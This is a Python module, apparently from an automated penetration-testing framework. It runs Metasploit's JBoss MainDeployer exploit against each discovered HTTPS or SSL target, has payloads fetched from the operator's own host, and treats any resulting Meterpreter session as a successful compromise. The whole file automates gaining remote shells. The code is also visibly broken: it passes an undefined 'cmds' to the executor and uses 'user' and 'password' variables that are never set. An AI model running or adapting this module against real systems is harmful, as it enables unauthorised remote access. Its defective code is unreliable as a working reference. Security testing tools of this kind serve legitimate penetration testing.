import re

from core.msfActionModule import msfActionModule
from core.keystore import KeyStore as kb
from core.utils import Utils


class exploit_msf_jboss_maindeployer(msfActionModule):
    def __init__(self, config, display, lock):
        super(exploit_msf_jboss_maindeployer, self).__init__(config, display, lock)
        self.triggers = ["newJbossPassword"]
        self.requirements = ["msfconsole"]
        self.types = ["http"]
        self.title = "Attempt to gain shell via Jboss"
        self.shortName = "MSFJbossMainDeployer"
        self.description = "execute [exploit/multi/http/jboss_maindeployer] on each target"
        self.safeLevel = 3

    def getTargets(self):
        self.targets = kb.get('port/tcp/443', 'port/tcp/8443', 'service/https', 'service/ssl')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # If any results are succesful, this will become true and Fire will be called in the end
            callFire = False

            # loop over each target
            for t in self.targets:
                ports = kb.get('service/http/' + t + '/tcp')
                for p in ports:
                    cmd = {
                            'config':[
                                    "use exploit/multi/http/jboss_maindeployer",
                                    "set RHOST %s" % t,
                                    "set RPORT %s" % p,
                                    "set SVHOST %s" % self.config['lhost'],
                                    "set target 2",
                                    "set fingerprintcheck false"
                                ],
                            'payload':'linux'}
                    result, outfile = self.msfExec(t, cmds)

                    parts = re.findall(".*Meterpreter session.*", result)
                    for part in parts:
                        callFire = True
                        self.addVuln(t, self.shortName, {"port": p, "username": user, "password": password, "output": outfile.replace("/", "%2F")})
                        kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"    ))

            if callFire:
                self.fire("msfSession")

        return
